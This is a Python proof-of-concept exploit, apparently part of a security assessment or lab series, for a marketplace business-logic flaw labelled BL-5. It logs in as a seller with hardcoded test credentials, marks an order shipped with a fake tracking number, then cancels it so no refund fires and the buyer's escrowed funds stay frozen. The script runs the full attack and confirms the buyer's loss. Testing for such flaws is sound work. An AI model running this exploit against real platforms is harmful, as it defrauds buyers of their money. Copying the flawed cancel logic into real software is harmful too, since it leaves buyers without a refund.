#!/usr/bin/env python3
"""
BL-5 — Frozen Escrow via Seller-Cancelled Shipped Order
Endpoint: PUT /api/orders/{id}/cancel
Auth    : Seller account

OrderStatus.cancelled was added to the valid transitions from shipped.
The cancel endpoint only triggers a refund when order.status == paid.
Cancelling from shipped status issues no refund — escrow stays held
permanently with no release mechanism. Buyer loses their funds.

Attack flow (malicious seller):
  1. Buyer places order → escrow holds buyer's funds
  2. Seller ships (or fakes it) → status = shipped
  3. Seller immediately cancels → status = cancelled, no refund
  4. Buyer never receives goods, never gets refunded, escrow locked forever

Usage
-----
    python poc_014_frozen_escrow_shipped_cancel.py
"""

import argparse
import sys
import requests

BUYER_EMAIL     = "charlie@mercury.com"
BUYER_PASSWORD  = "Buyer123!"
SELLER_EMAIL    = "alice@mercury.com"
SELLER_PASSWORD = "Seller123!"


def banner():
    print("=" * 60)
    print("  BL-5 — Frozen Escrow: Seller Cancels After Shipping")
    print("  Endpoint: PUT /api/orders/{id}/cancel")
    print("=" * 60)


def login(base_url, email, password, label):
    resp = requests.post(f"{base_url}/api/auth/login",
                         json={"email": email, "password": password}, timeout=10)
    resp.raise_for_status()
    token = resp.json().get("access_token")
    if not token:
        print(f"[-] Login failed for {label}"); sys.exit(1)
    print(f"[+] Authenticated as {label}")
    return token


def get_balance(base_url, token):
    resp = requests.get(f"{base_url}/api/wallet",
                        headers={"Authorization": f"Bearer {token}"}, timeout=10)
    resp.raise_for_status()
    return resp.json()["balance"]


def deposit(base_url, token, amount):
    requests.post(f"{base_url}/api/wallet/deposit",
                  headers={"Authorization": f"Bearer {token}"},
                  json={"amount": amount, "payment_method": "card"}, timeout=10)


def create_product(base_url, token):
    resp = requests.post(f"{base_url}/api/products",
                         headers={"Authorization": f"Bearer {token}"},
                         json={"title": "Frozen Escrow Test Item",
                               "description": "Temporary product for BL-5 demo.",
                               "price": 10.00,
                               "quantity": 5,
                               "product_type": "shippable",
                               "category": "Other"}, timeout=10)
    resp.raise_for_status()
    product_id = resp.json()["id"]
    print(f"[*] Created temp product (id={product_id}) owned by seller")
    return product_id


def cleanup_product(base_url, token, product_id):
    requests.delete(f"{base_url}/api/products/{product_id}",
                    headers={"Authorization": f"Bearer {token}"}, timeout=10)
    print(f"[*] Cleaned up temp product (id={product_id})")


def place_order(base_url, token, product_id):
    resp = requests.post(f"{base_url}/api/orders",
                         headers={"Authorization": f"Bearer {token}"},
                         json={"items": [{"product_id": product_id, "quantity": 1}],
                               "shipping_address": "victim address"}, timeout=10)
    resp.raise_for_status()
    data = resp.json()
    print(f"[+] Order placed (id={data['id']}, total=${data['total_amount']:.2f}, status={data['status']})")
    return data["id"], data["total_amount"]


def ship_order(base_url, token, order_id):
    resp = requests.put(f"{base_url}/api/orders/{order_id}/ship",
                        headers={"Authorization": f"Bearer {token}"},
                        json={"tracking_number": "FAKE123"}, timeout=10)
    resp.raise_for_status()
    print(f"[+] Order {order_id} shipped (status={resp.json()['status']})")


def cancel_order(base_url, token, order_id):
    resp = requests.put(f"{base_url}/api/orders/{order_id}/cancel",
                        headers={"Authorization": f"Bearer {token}"},
                        json={"reason": "Changed my mind"}, timeout=10)
    if resp.status_code == 200:
        print(f"[+] Order {order_id} cancelled (status={resp.json()['status']})")
        return True
    else:
        print(f"[-] Cancel failed: {resp.status_code} — {resp.json().get('detail')}")
        return False


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", default="http://localhost:8000")
    args = parser.parse_args()

    banner()
    buyer_token  = login(args.url, BUYER_EMAIL,  BUYER_PASSWORD,  "Buyer  (charlie)")
    seller_token = login(args.url, SELLER_EMAIL, SELLER_PASSWORD, "Seller (alice)  ")
    print()

    product_id = create_product(args.url, seller_token)

    deposit(args.url, buyer_token, 500)
    balance_before = get_balance(args.url, buyer_token)
    print(f"[*] Buyer balance before order: ${balance_before:.2f}")

    order_id, total = place_order(args.url, buyer_token, product_id)
    balance_after_order = get_balance(args.url, buyer_token)
    print(f"[*] Buyer balance after order : ${balance_after_order:.2f}  (${total:.2f} in escrow)")

    ship_order(args.url, seller_token, order_id)

    print(f"[*] Seller now cancels the shipped order (no refund will fire) ...")
    cancelled = cancel_order(args.url, seller_token, order_id)

    balance_final = get_balance(args.url, buyer_token)
    print()
    print(f"[+] Buyer balance final : ${balance_final:.2f}")
    print(f"[+] Funds lost          : ${balance_after_order - balance_final:.2f}")
    if cancelled and balance_final == balance_after_order:
        print(f"[+] CONFIRMED — ${total:.2f} frozen in escrow forever. Buyer has no recourse.")

    cleanup_product(args.url, seller_token, product_id)
    print("\n[+] Done.")


if __name__ == "__main__":
    main()
